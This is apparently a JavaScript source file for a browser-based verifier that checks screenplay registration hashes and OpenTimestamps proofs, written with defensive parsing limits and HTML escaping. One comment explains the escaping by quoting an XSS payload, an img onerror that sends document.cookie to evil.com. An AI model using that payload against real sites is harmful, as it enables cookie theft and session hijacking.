/**
 * Browser-native client-side verifier for The Screenplay Registry.
 *
 * Implements normalize + canonicalize + claim-hash + OTS file-digest check
 * entirely in the browser via Web Crypto API and TextEncoder. No npm deps and
 * no network requests for the verification path; the one import is the project's
 * own .screenreg container reader (a local, same-origin module — used only to
 * UNPACK a dropped bundle into its parts, which are then verified by the
 * independent inline implementation below).
 *
 * What this verifier DOES:
 *  - Accepts either a single .screenreg bundle or the loose script + manifest + .ots
 *  - Re-normalizes the script per screenplay-registration-norm/v1-strict
 *  - Recomputes the contentHash (SHA-256)
 *  - Recomputes the claimHash via RFC 8785 canonicalization
 *  - Verifies the .ots proof's file digest matches the claimHash
 *  - Extracts attestation summary (Bitcoin block heights, pending calendars)
 *
 * What this verifier DOES NOT do yet:
 *  - Verify the scene-tree root (requires the full Merkle implementation)
 *  - Verify Bitcoin block headers against the chain (requires either bundled
 *    checkpoints or a public block-explorer API)
 *  - Decrypt encrypted manifest fields (would need a password prompt)
 *
 * For full verification, run the CLI.
 */

import { readScreenreg, ScreenregError } from './lib/screenreg/index.js'

// ---------------------------------------------------------------------------
// HTML escape — applied to EVERY untrusted-data interpolation into innerHTML.
//
// Without this, a malicious .ots proof could declare a pending calendar URL
// like `<img src=x onerror=fetch('//evil.com?'+document.cookie)>` and the
// browser would execute it, breaking the verifier's "zero network requests"
// privacy claim. Filenames are also user-supplied (drag-dropped) and can
// contain HTML metachars.
// ---------------------------------------------------------------------------

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}

// ---------------------------------------------------------------------------
// Web Crypto wrappers
// ---------------------------------------------------------------------------

async function sha256(bytes) {
  const hash = await crypto.subtle.digest('SHA-256', bytes)
  return new Uint8Array(hash)
}

function toHex(bytes) {
  return [...bytes].map((b) => b.toString(16).padStart(2, '0')).join('')
}

// ---------------------------------------------------------------------------
// Normalization (screenplay-registration-norm/v1-strict)
// ---------------------------------------------------------------------------

function validateStrictUtf8(bytes) {
  let i = 0
  const n = bytes.length
  while (i < n) {
    const b0 = bytes[i]
    if (b0 < 0x80) { i += 1; continue }
    let seqLen, codepoint, minCp
    if ((b0 & 0xe0) === 0xc0) { seqLen = 2; codepoint = b0 & 0x1f; minCp = 0x80 }
    else if ((b0 & 0xf0) === 0xe0) { seqLen = 3; codepoint = b0 & 0x0f; minCp = 0x800 }
    else if ((b0 & 0xf8) === 0xf0) { seqLen = 4; codepoint = b0 & 0x07; minCp = 0x10000 }
    else return { ok: false, offset: i }
    if (i + seqLen > n) return { ok: false, offset: i }
    for (let j = 1; j < seqLen; j++) {
      const bj = bytes[i + j]
      if ((bj & 0xc0) !== 0x80) return { ok: false, offset: i + j }
      codepoint = (codepoint << 6) | (bj & 0x3f)
    }
    if (codepoint < minCp) return { ok: false, offset: i }
    if (codepoint >= 0xd800 && codepoint <= 0xdfff) return { ok: false, offset: i }
    if (codepoint > 0x10ffff) return { ok: false, offset: i }
    i += seqLen
  }
  return { ok: true }
}

function normalize(bytes) {
  const v = validateStrictUtf8(bytes)
  if (!v.ok) return { ok: false, reason: 'invalid-utf8', detail: `Invalid UTF-8 at offset ${v.offset}` }

  let working = bytes
  const transforms = []

  // Strip BOM
  if (working.length >= 3 && working[0] === 0xef && working[1] === 0xbb && working[2] === 0xbf) {
    working = working.subarray(3)
    transforms.push({ kind: 'stripped-bom', count: 1 })
  }

  // NFC
  const decoder = new TextDecoder('utf-8', { fatal: true })
  const decoded = decoder.decode(working)
  const nfc = decoded.normalize('NFC')
  if (nfc !== decoded) transforms.push({ kind: 'applied-nfc', count: Math.abs(nfc.length - decoded.length) || 1 })
  const encoder = new TextEncoder()
  working = encoder.encode(nfc)

  // CRLF / lone CR → LF
  const out = []
  let crlf = 0, loneCr = 0
  for (let i = 0; i < working.length; i++) {
    const b = working[i]
    if (b === 0x0d) {
      const next = i + 1 < working.length ? working[i + 1] : undefined
      if (next === 0x0a) { out.push(0x0a); i++; crlf++ }
      else { out.push(0x0a); loneCr++ }
    } else {
      out.push(b)
    }
  }
  if (crlf > 0) transforms.push({ kind: 'crlf-to-lf', count: crlf })
  if (loneCr > 0) transforms.push({ kind: 'cr-to-lf', count: loneCr })

  return { ok: true, normalized: new Uint8Array(out), transforms }
}

// ---------------------------------------------------------------------------
// RFC 8785 canonicalization
// ---------------------------------------------------------------------------

function canonicalize(value) {
  if (value === null) return 'null'
  if (value === true) return 'true'
  if (value === false) return 'false'
  if (typeof value === 'number') {
    if (!Number.isFinite(value)) throw new Error('NaN/Infinity not allowed')
    if (Object.is(value, -0)) return '0'
    return String(value)
  }
  if (typeof value === 'string') return serializeString(value)
  if (Array.isArray(value)) return '[' + value.map(canonicalize).join(',') + ']'
  if (typeof value === 'object') {
    const keys = Object.keys(value).filter((k) => value[k] !== undefined).sort()
    if (keys.length === 0) return '{}'
    return '{' + keys.map((k) => serializeString(k) + ':' + canonicalize(value[k])).join(',') + '}'
  }
  throw new Error(`cannot canonicalize ${typeof value}`)
}

function serializeString(s) {
  let out = '"'
  for (let i = 0; i < s.length; i++) {
    const code = s.charCodeAt(i)
    if (code === 0x22) out += '\\"'
    else if (code === 0x5c) out += '\\\\'
    else if (code === 0x08) out += '\\b'
    else if (code === 0x09) out += '\\t'
    else if (code === 0x0a) out += '\\n'
    else if (code === 0x0c) out += '\\f'
    else if (code === 0x0d) out += '\\r'
    else if (code < 0x20) out += '\\u' + code.toString(16).padStart(4, '0')
    else out += s[i]
  }
  out += '"'
  return out
}

// ---------------------------------------------------------------------------
// OTS parser (file-digest extraction + attestation summary)
// ---------------------------------------------------------------------------

const HEADER_MAGIC = new Uint8Array([
  0x00, 0x4f, 0x70, 0x65, 0x6e, 0x54, 0x69, 0x6d, 0x65, 0x73, 0x74, 0x61, 0x6d, 0x70, 0x73, 0x00,
  0x00, 0x50, 0x72, 0x6f, 0x6f, 0x66, 0x00, 0xbf, 0x89, 0xe2, 0xe8, 0x84, 0xe8, 0x92, 0x94,
])

class Reader {
  constructor(buf) { this.buf = buf; this.pos = 0 }
  readByte() { if (this.pos >= this.buf.length) throw new Error('EOF'); return this.buf[this.pos++] }
  readBytes(n) { if (this.pos + n > this.buf.length) throw new Error('EOF'); const r = this.buf.subarray(this.pos, this.pos + n); this.pos += n; return r }
  remaining() { return this.buf.length - this.pos }
  // SECURITY: BigInt arithmetic so we don't truncate to Int32 (the `|=` and
  // `<<` operators coerce to 32-bit signed in JS) — same bug fixed in the Node
  // version. A varuint that decodes beyond Number.MAX_SAFE_INTEGER is rejected
  // outright (no legitimate OTS field needs that).
  readVarUint() {
    let result = 0n
    let shift = 0n
    for (let i = 0; i < 9; i++) {
      const b = this.readByte()
      result |= BigInt(b & 0x7f) << shift
      if ((b & 0x80) === 0) {
        if (result > BigInt(Number.MAX_SAFE_INTEGER)) throw new Error(`varuint too large for safe JS number: ${result}`)
        return Number(result)
      }
      shift += 7n
      if (shift >= 63n) throw new Error('varuint too large')
    }
    throw new Error('varuint missing terminator')
  }
  readVarBytes() {
    const len = this.readVarUint()
    // SECURITY: cap declared length to bytes actually remaining — a malicious
    // .ots could claim a huge length to force a giant subarray allocation OR
    // trip an out-of-bounds throw at attacker-controlled offsets.
    if (len > this.remaining()) throw new Error(`readVarBytes: declared length ${len} exceeds remaining ${this.remaining()}`)
    return this.readBytes(len)
  }
}

// SECURITY: cap input .ots size to bound parser memory + CPU. Legitimate
// Bitcoin-anchored OTS proofs are <10 KB. 8 MiB is generous.
const MAX_OTS_BYTES = 8 * 1024 * 1024
// SECURITY: cap fork-recursion depth in walkTimestamp. Legitimate proofs have
// a handful of forks (one per active calendar); deep nesting is adversarial.
const MAX_TIMESTAMP_FORK_DEPTH = 128

const TAG_BITCOIN = new Uint8Array([0x05, 0x88, 0x96, 0x0d, 0x73, 0xd7, 0x19, 0x01])
const TAG_PENDING = new Uint8Array([0x83, 0xdf, 0xe3, 0x0d, 0x2e, 0xf9, 0x0c, 0x8e])

function bytesEqual(a, b) {
  if (a.length !== b.length) return false
  for (let i = 0; i < a.length; i++) if (a[i] !== b[i]) return false
  return true
}

function parseOts(bytes) {
  if (bytes.length > MAX_OTS_BYTES) {
    return { ok: false, reason: `.ots file too large: ${bytes.length} bytes (max ${MAX_OTS_BYTES})` }
  }
  const r = new Reader(bytes)
  try {
    const magic = r.readBytes(HEADER_MAGIC.length)
    if (!bytesEqual(magic, HEADER_MAGIC)) throw new Error('magic mismatch')
    const major = r.readVarUint()
    if (major !== 1) throw new Error(`unsupported version ${major}`)
    const opTag = r.readByte()
    if (opTag !== 0x08) throw new Error(`expected sha256 op (0x08), got 0x${opTag.toString(16)}`)
    const fileDigest = r.readBytes(32)
    const attestations = []
    walkTimestamp(r, fileDigest, attestations, 0)
    return { ok: true, fileDigestHex: toHex(fileDigest), attestations }
  } catch (e) {
    return { ok: false, reason: e.message }
  }
}

function walkTimestamp(r, msg, attestations, depth) {
  if (depth > MAX_TIMESTAMP_FORK_DEPTH) {
    throw new Error(`OTS timestamp tree exceeds maximum fork depth ${MAX_TIMESTAMP_FORK_DEPTH}; possible malicious nesting`)
  }
  // Browser-side: just walk the structure to find attestations.
  // We don't re-execute SHA256/APPEND/PREPEND ops because for "does the .ots
  // anchor THIS file digest" the answer comes from the header — the file_digest
  // is right after the magic + version + op tag. The tree walk only confirms
  // the digest leads to a Bitcoin attestation via the operations. The Node CLI
  // does that full verification; this browser-side check confirms structure +
  // file-digest match + attestation summary.
  while (true) {
    const tag = r.readByte()
    if (tag === 0xff) { walkTimestamp(r, msg, attestations, depth + 1); continue }
    if (tag === 0x00) {
      const attTag = r.readBytes(8)
      const payload = r.readVarBytes()
      if (bytesEqual(attTag, TAG_BITCOIN)) {
        const pr = new Reader(payload)
        attestations.push({ kind: 'bitcoin', blockHeight: pr.readVarUint() })
      } else if (bytesEqual(attTag, TAG_PENDING)) {
        const pr = new Reader(payload)
        attestations.push({ kind: 'pending', calendarUrl: new TextDecoder().decode(pr.readVarBytes()) })
      } else {
        attestations.push({ kind: 'unknown', tag: toHex(attTag) })
      }
      return
    }
    if (tag === 0x08 || tag === 0x02 || tag === 0x03 || tag === 0x67) {
      // Crypto ops (SHA256/SHA1/RIPEMD160/KECCAK256) — skip; we're not re-executing
      continue
    }
    if (tag === 0xf0 || tag === 0xf1) {
      // APPEND / PREPEND — skip the argument
      r.readVarBytes()
      continue
    }
    throw new Error(`unknown op tag 0x${tag.toString(16)}`)
  }
}

// ---------------------------------------------------------------------------
// UI
// ---------------------------------------------------------------------------

const dropZone = document.getElementById('drop')
const fileInput = document.getElementById('file-input')
const filesList = document.getElementById('files')
const verifyBtn = document.getElementById('verify-btn')
const resultEl = document.getElementById('result')

const collected = { script: null, envelope: null, ots: null }
// Set when a dropped .screenreg's declared digests don't match its bytes (corruption, or a
// tampered non-committed entry). The verdict still comes from the independent inline checks below;
// this is a transparency warning, not the security boundary.
let bundleIntegrityIssues = null

// Web Crypto (SHA-256) is only available in a secure context (HTTPS). Returns a message if it is
// unavailable, else null — so we fail clearly instead of a raw `crypto.subtle is undefined`.
function secureContextError() {
  return globalThis.crypto && globalThis.crypto.subtle
    ? null
    : 'A secure (HTTPS) connection is required to verify a proof in your browser. Please reload over HTTPS.'
}

function classify(name, bytes) {
  if (name.endsWith('.manifest.json') || name.endsWith('.json')) return 'envelope'
  if (name.endsWith('.proof.ots') || name.endsWith('.ots')) return 'ots'
  // Fountain / text fallback
  return 'script'
}

function fmtBytes(n) {
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1024 / 1024).toFixed(1)} MB`
}

async function addFile(file) {
  const bytes = new Uint8Array(await file.arrayBuffer())
  if (file.name.endsWith('.screenreg')) {
    await addBundle(file.name, bytes) // addBundle (re)sets bundleIntegrityIssues for the new bundle
    return
  }
  const kind = classify(file.name, bytes)
  // The integrity warning describes the bundle that supplied the envelope. Adding a loose script
  // alongside a (mismatched) bundle must KEEP the warning. Only a loose envelope — which REPLACES
  // the bundle's envelope as the verified source — clears it.
  if (kind === 'envelope') bundleIntegrityIssues = null
  collected[kind] = { name: file.name, bytes }
  render()
}

// Unpack a dropped .screenreg into its parts (envelope, proof, and — for a full bundle — the
// screenplay). The unpack uses the project's audited container reader; the resulting bytes are
// then verified by the independent inline implementation, so a malformed/hostile bundle can only
// fail verification, never forge a pass.
async function addBundle(name, bytes) {
  const sce = secureContextError()
  if (sce) {
    resultEl.innerHTML = `<div class="result err"><h3>✗ Secure connection required</h3>${escapeHtml(sce)}</div>`
    return
  }
  let parsed
  try {
    parsed = await readScreenreg(bytes)
  } catch (e) {
    const msg = e instanceof ScreenregError ? e.message : (e && e.message) || String(e)
    // A bad bundle must not leave previously-collected inputs verifiable behind the error — clear
    // them and disable the button so the user can't verify stale files they think they replaced.
    collected.script = null
    collected.envelope = null
    collected.ots = null
    bundleIntegrityIssues = null
    render()
    resultEl.innerHTML = `<div class="result err"><h3>✗ Could not read ${escapeHtml(name)}</h3>${escapeHtml(msg)}</div>`
    return
  }
  bundleIntegrityIssues = parsed.integrity.ok ? null : parsed.integrity.issues
  collected.envelope = { name: `envelope.json — from ${name}`, bytes: parsed.envelopeBytes }
  if (parsed.otsBytes) collected.ots = { name: `proof.ots — from ${name}`, bytes: parsed.otsBytes }
  // A full bundle supplies the screenplay. An evidence bundle does not — and must NOT wipe a
  // screenplay the user dropped alongside it, so the drop order doesn't matter.
  if (parsed.sourceText) {
    collected.script = { name: `screenplay — embedded in ${name}`, bytes: parsed.sourceText }
  }
  render()
}

function render() {
  filesList.innerHTML = ''
  for (const kind of ['script', 'envelope', 'ots']) {
    const f = collected[kind]
    if (!f) continue
    const row = document.createElement('div')
    row.className = 'file-row'
    row.innerHTML = `<span class="kind">${escapeHtml(kind)}</span><span class="name">${escapeHtml(f.name)}</span><span class="size">${escapeHtml(fmtBytes(f.bytes.length))}</span>`
    filesList.appendChild(row)
  }
  // The envelope + proof are enough to verify existence + time. The screenplay is optional: with
  // it, we also confirm the contents (the contentHash). An evidence bundle has no script, and that
  // is a valid thing to verify.
  verifyBtn.disabled = !(collected.envelope && collected.ots)
}

dropZone.addEventListener('click', () => fileInput.click())
fileInput.addEventListener('change', async (e) => {
  for (const file of e.target.files) await addFile(file)
})
dropZone.addEventListener('dragover', (e) => {
  e.preventDefault()
  dropZone.classList.add('active')
})
dropZone.addEventListener('dragleave', () => dropZone.classList.remove('active'))
dropZone.addEventListener('drop', async (e) => {
  e.preventDefault()
  dropZone.classList.remove('active')
  for (const file of e.dataTransfer.files) await addFile(file)
})

verifyBtn.addEventListener('click', async () => {
  const sce = secureContextError()
  if (sce) {
    resultEl.innerHTML = `<div class="result err"><h3>✗ Secure connection required</h3>${escapeHtml(sce)}</div>`
    return
  }
  resultEl.innerHTML = '<div class="result"><h3>Verifying...</h3></div>'
  try {
    const result = await verifyAll()
    renderResult(result)
  } catch (e) {
    resultEl.innerHTML = `<div class="result err"><h3>✗ Error</h3>${escapeHtml(e.message)}</div>`
  }
})

async function verifyAll() {
  let envelope
  try {
    envelope = JSON.parse(new TextDecoder().decode(collected.envelope.bytes))
  } catch {
    return { ok: false, status: 'Malformed manifest JSON', detail: collected.envelope.name }
  }

  // The screenplay is optional. With it, confirm the contents (contentHash); without it (an
  // evidence bundle, or a manifest+proof pair), verify existence + time only.
  const contentsVerified = !!collected.script
  let contentHashHex
  let transforms
  if (contentsVerified) {
    const normResult = normalize(collected.script.bytes)
    if (!normResult.ok) {
      return { ok: false, status: 'INVALID UTF-8', detail: normResult.detail }
    }
    transforms = normResult.transforms
    const contentHashBytes = await sha256(normResult.normalized)
    contentHashHex = 'sha256:' + toHex(contentHashBytes)
    const expectedContentHash = envelope?.committedClaim?.contentHash
    if (contentHashHex !== expectedContentHash) {
      return {
        ok: false,
        status: 'Content hash mismatch',
        detail: `Your file hashes to ${contentHashHex}\nThe manifest expects ${expectedContentHash}\n\nMost common cause: the file was edited after registration, or it was saved by a different tool with different invisible defaults (BOM / line endings / character composition).`,
        transforms: normResult.transforms,
      }
    }
  }

  // Recompute claimHash via canonicalization
  const canonical = canonicalize(envelope.committedClaim)
  const claimHashBytes = await sha256(new TextEncoder().encode(canonical))
  const claimHashHex = 'sha256:' + toHex(claimHashBytes)

  if (envelope.evidenceBundle?.committedClaimHash !== claimHashHex) {
    return {
      ok: false,
      status: 'Envelope tampering detected',
      detail: `Computed claim hash ${claimHashHex} does not match the envelope's stored committedClaimHash ${envelope.evidenceBundle?.committedClaimHash}. The manifest has been modified after creation.`,
    }
  }

  // Parse + verify OTS
  const parsedOts = parseOts(collected.ots.bytes)
  if (!parsedOts.ok) {
    return { ok: false, status: 'OTS proof unparseable', detail: parsedOts.reason }
  }
  const claimHashHexNoPrefix = claimHashHex.slice('sha256:'.length)
  if (parsedOts.fileDigestHex !== claimHashHexNoPrefix) {
    return {
      ok: false,
      status: 'OTS proof does not anchor this claim',
      detail: `The .ots proof anchors digest ${parsedOts.fileDigestHex}, but this manifest's claim hash is ${claimHashHexNoPrefix}. Wrong .ots file paired with this manifest?`,
    }
  }

  const bitcoinHeights = parsedOts.attestations.filter((a) => a.kind === 'bitcoin').map((a) => a.blockHeight)
  const pendingUrls = parsedOts.attestations.filter((a) => a.kind === 'pending').map((a) => a.calendarUrl)

  return {
    ok: true,
    bitcoinAnchored: bitcoinHeights.length > 0,
    bitcoinHeights,
    pendingUrls,
    contentsVerified,
    contentHash: contentsVerified ? contentHashHex : envelope.committedClaim?.contentHash,
    claimHash: claimHashHex,
    sceneCount: envelope.committedClaim.sceneCount,
    // The field NAMES are non-secret; the values stay ciphertext. Surface their
    // presence so an encrypted bundle isn't silent about them.
    encryptedFieldNames: (envelope.committedClaim?.encryptedFields?.fields ?? []).map((f) => f.name),
  }
}

function renderResult(r) {
  if (r.ok) {
    const cls = r.bitcoinAnchored ? 'ok' : 'pending'
    const symbol = r.bitcoinAnchored ? '✓' : '◯'
    // Bitcoin attestation present (not full SPV — see threat-model). Match the
    // CLI's honest wording so the browser verifier and CLI agree on what was
    // actually verified vs what the upstream calendar attested.
    const headline = r.bitcoinAnchored
      ? 'VERIFIED — Bitcoin attestation present'
      : 'VERIFIED — pending Bitcoin confirmation'
    // Sanitize EVERY interpolated value: hashes are usually safe sha256:hex
    // strings but defense-in-depth + pendingUrls come straight from the .ots
    // proof which is attacker-controllable.
    const bitcoinLine = r.bitcoinAnchored
      ? `Bitcoin block:    ${escapeHtml(r.bitcoinHeights.join(', '))} ✓ (attestation parsed; full SPV in v0.2)`
      : `Bitcoin block:    PENDING — calendars: ${escapeHtml(r.pendingUrls.join(', '))}\n                   Re-verify in 1-6 hours after the OTS calendar's batch is included in a Bitcoin block.`
    // When no screenplay was supplied (an evidence bundle), the date + commitment are verified but
    // the contents are not — say so plainly rather than implying the script was checked.
    const contentsLine = r.contentsVerified
      ? `Content hash:     ${escapeHtml(r.contentHash)} ✓ matches your screenplay`
      : `Content hash:     ${escapeHtml(r.contentHash || '(none in bundle)')}\n                   NOT checked — no screenplay supplied. This proves a document with this\n                   fingerprint existed by the date below. Drop the screenplay to also confirm the contents.`
    // A .screenreg whose declared checksums don't match its bytes still verifies here IF the
    // envelope/proof/script are internally valid (the inline checks are authoritative). Surface
    // the discrepancy as a transparency warning rather than failing or hiding it.
    const integrityLine = bundleIntegrityIssues
      ? `\n⚠ Bundle checksum mismatch — the proof above verifies independently, but the .screenreg's own manifest digests did not match: ${escapeHtml(bundleIntegrityIssues.join('; '))}`
      : ''
    // Encrypted title/author present? Announce it (names only) — never the values.
    const encLine = r.encryptedFieldNames && r.encryptedFieldNames.length > 0
      ? `Encrypted:        ${escapeHtml(r.encryptedFieldNames.join(', '))} 🔒 present as ciphertext — unlock with your password\n`
      : ''
    resultEl.innerHTML = `<div class="result ${cls}"><h3>${symbol} ${escapeHtml(headline)}</h3>${contentsLine}
Claim hash:       ${escapeHtml(r.claimHash)}
${r.sceneCount !== undefined ? `Scene count:      ${escapeHtml(String(r.sceneCount))}\n` : ''}${encLine}${bitcoinLine}${integrityLine}</div>`
  } else {
    const tx = r.transforms ? '\n\nNormalization transforms applied: ' + r.transforms.map((t) => `${escapeHtml(t.kind)}(${escapeHtml(String(t.count))})`).join(', ') : ''
    resultEl.innerHTML = `<div class="result err"><h3>✗ FAILED — ${escapeHtml(r.status)}</h3>${escapeHtml(r.detail || '')}${tx}</div>`
  }
}
